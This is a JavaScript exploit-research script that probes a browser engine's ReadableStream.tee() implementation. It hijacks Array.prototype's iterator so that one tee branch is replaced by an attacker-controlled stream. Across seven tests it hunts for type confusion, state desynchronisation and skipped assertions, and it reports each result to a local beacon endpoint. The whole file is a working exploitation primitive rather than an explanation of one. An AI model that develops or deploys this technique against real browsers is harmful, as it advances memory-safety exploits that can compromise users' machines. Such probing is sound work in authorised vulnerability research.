/*
 * p433c -- Substitute branch2 with a REAL ReadableStream
 *
 * V433B showed all operations crash because fake object has no private slots.
 * What if we substitute with a REAL ReadableStream that HAS the right private
 * slots (@state, @reader, @readableStreamController, @globalObject)?
 *
 * fromObject() wraps ANY JSObject as InternalReadableStream. A ReadableStream
 * IS a JSObject. The builtins would read its private slots and find valid values.
 *
 * This creates a STREAM WRAPPING A STREAM:
 * - Outer: ReadableStream wrapper (from tee return)
 * - Inner InternalReadableStream: wraps our controlled ReadableStream
 * - Our ReadableStream: has its own controller, state, reader slots
 *
 * If the builtins treat our inner RS as a valid internal stream, we can:
 * 1. getReader() on the outer -> acquires reader on our inner RS
 * 2. Read data that WE control (from our inner RS's source)
 * 3. While the real tee branch2 gets DIFFERENT data from the tee pull
 *
 * Tests:
 *   A: Sub with empty closed RS -> see if getReader/read works
 *   B: Sub with RS that has data -> see if we read OUR data
 *   C: Sub with errored RS -> see if error propagation hits compiled-out asserts
 *   D: Sub with RS, getReader, then close underlying -> state confusion
 *   E: Sub with RS, cancel outer -> what gets cancelled?
 *   F: Sub with RS whose controller we hold -> enqueue through our controller
 *
 * Beacon prefix: V433C-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V433C-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

function teeSub(fakeObj) {
  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("tee-data");
      controller.close();
    }
  });

  var intercepted = false;
  var realBranch2 = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        realBranch2 = self[1];
        var items = [self[0], fakeObj];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return {branches: branches, realBranch2: realBranch2};
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    B("TEESUB-ERR", e.message.slice(0, 80));
    return null;
  }
}

// ================================================================
// Test A: Substitute with a closed ReadableStream
// ================================================================

function testA() {
  B("A-START");

  var innerRS = new ReadableStream({
    start: function(c) { c.close(); }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("A-TEE-OK", {isRS: outer instanceof ReadableStream});

  // Try locked
  try {
    B("A-LOCKED", outer.locked);
  } catch(e) {
    B("A-LOCKED-ERR", e.message.slice(0, 60));
  }

  // Try getReader
  try {
    var reader = outer.getReader();
    B("A-READER-OK");

    reader.read().then(function(r) {
      B("A-READ", {done: r.done, val: r.value === undefined ? "undef" : String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("A-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("A-READER-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test B: Substitute with RS that has our controlled data
// ================================================================

function testB() {
  B("B-START");

  var innerRS = new ReadableStream({
    start: function(c) {
      c.enqueue("ATTACKER-CONTROLLED-DATA");
      c.close();
    }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("B-TEE-OK");

  try {
    var reader = outer.getReader();
    B("B-READER-OK");

    reader.read().then(function(r) {
      B("B-READ-0", {done: r.done, val: String(r.value).slice(0, 60)});
      return reader.read();
    }).then(function(r) {
      B("B-READ-1", {done: r.done});
    }).catch(function(e) {
      B("B-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("B-READER-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test C: Substitute with an errored RS
// builtins read @state = @streamErrored, might skip checks
// ================================================================

function testC() {
  B("C-START");

  var innerRS = new ReadableStream({
    start: function(c) {
      c.error(new Error("INJECTED-ERROR"));
    }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("C-TEE-OK");

  try {
    B("C-LOCKED", outer.locked);
  } catch(e) {
    B("C-LOCKED-ERR", e.message.slice(0, 60));
  }

  try {
    var reader = outer.getReader();
    B("C-READER-OK");

    reader.read().then(function(r) {
      B("C-READ", {done: r.done, val: String(r.value).slice(0, 40)});
    }).catch(function(e) {
      B("C-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("C-READER-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test D: Sub with RS, get reader on outer, then manipulate inner
// Create inner RS with held controller, get reader on outer,
// then enqueue through inner controller
// ================================================================

function testD() {
  B("D-START");

  var innerCtrl = null;
  var innerRS = new ReadableStream({
    start: function(c) { innerCtrl = c; }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("D-TEE-OK", {hasCtrl: !!innerCtrl});

  try {
    var reader = outer.getReader();
    B("D-READER-OK", {outerLocked: outer.locked});

    // Now enqueue through inner controller
    innerCtrl.enqueue("INJECTED-VIA-INNER-CTRL");
    B("D-ENQUEUE-OK");

    reader.read().then(function(r) {
      B("D-READ-0", {done: r.done, val: String(r.value).slice(0, 60)});

      // Close inner
      innerCtrl.close();
      B("D-CLOSE-OK");

      return reader.read();
    }).then(function(r) {
      B("D-READ-1", {done: r.done});
    }).catch(function(e) {
      B("D-READ-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("D-READER-ERR", e.message.slice(0, 80));
  }
}

// ================================================================
// Test E: Read from branch0 AND outer branch1 simultaneously
// branch0 gets data from tee pull, outer gets data from inner RS
// Does this cause the tee state machine to desync?
// ================================================================

function testE() {
  B("E-START");

  var innerCtrl = null;
  var innerRS = new ReadableStream({
    start: function(c) { innerCtrl = c; }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var branch0 = res.branches[0];
  var outer = res.branches[1];
  B("E-TEE-OK");

  try {
    var reader0 = branch0.getReader();
    B("E-R0-OK");

    var reader1 = outer.getReader();
    B("E-R1-OK");

    // Enqueue to inner controller
    innerCtrl.enqueue("INNER-DATA");

    // Read from both
    Promise.all([
      reader0.read(),
      reader1.read()
    ]).then(function(results) {
      B("E-BOTH", {
        r0: {done: results[0].done, val: String(results[0].value).slice(0, 40)},
        r1: {done: results[1].done, val: String(results[1].value).slice(0, 40)}
      });

      // Close inner, see what happens to tee state
      innerCtrl.close();

      return Promise.all([
        reader0.read(),
        reader1.read()
      ]);
    }).then(function(results) {
      B("E-AFTER-CLOSE", {
        r0: {done: results[0].done},
        r1: {done: results[1].done}
      });
    }).catch(function(e) {
      B("E-BOTH-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("E-EXCEPT", e.message.slice(0, 80));
  }
}

// ================================================================
// Test F: Cancel outer (which wraps inner RS), see what gets cancelled
// ================================================================

function testF() {
  B("F-START");

  var innerCancelled = false;
  var innerRS = new ReadableStream({
    start: function(c) {
      c.enqueue("F-DATA");
    },
    cancel: function(reason) {
      innerCancelled = true;
      B("F-INNER-CANCEL", String(reason).slice(0, 40));
    }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("F-TEE-OK");

  try {
    outer.cancel("OUTER-CANCEL").then(function() {
      B("F-CANCEL-OK", {innerCancelled: innerCancelled});
    }).catch(function(e) {
      B("F-CANCEL-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("F-CANCEL-EXCEPT", e.message.slice(0, 80));
  }
}

// ================================================================
// Test G: Response(outer).text() with RS substitute
// Response body consumption might work because inner RS has valid slots
// ================================================================

function testG() {
  B("G-START");

  var innerRS = new ReadableStream({
    start: function(c) {
      c.enqueue("RESPONSE-BODY-VIA-RS-SUB");
      c.close();
    }
  });

  var res = teeSub(innerRS);
  if (!res) return;

  var outer = res.branches[1];
  B("G-TEE-OK");

  try {
    var resp = new Response(outer);
    B("G-RESP-OK", resp.status);

    resp.text().then(function(text) {
      B("G-TEXT", {len: text.length, val: text.slice(0, 60)});
    }).catch(function(e) {
      B("G-TEXT-ERR", e.message.slice(0, 80));
    });
  } catch(e) {
    B("G-RESP-ERR", e.message.slice(0, 80));
  }
}

testA();
setTimeout(function() { testB(); }, 150);
setTimeout(function() { testC(); }, 300);
setTimeout(function() { testD(); }, 450);
setTimeout(function() { testE(); }, 600);
setTimeout(function() { testF(); }, 800);
setTimeout(function() { testG(); }, 1000);
setTimeout(function() { B("DONE"); }, 3000);
})();
